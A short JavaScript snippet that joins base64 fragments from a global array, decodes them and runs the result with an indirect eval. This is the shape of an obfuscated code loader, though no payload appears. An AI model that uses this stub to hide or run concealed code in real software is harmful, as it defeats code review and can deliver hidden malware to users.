(function(){
var b64=(window.__AB||[]).join("");
var bin=atob(b64);
var bytes=new Uint8Array(bin.length);
for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
var code=new TextDecoder("utf-8").decode(bytes);
(0,eval)(code);
})();
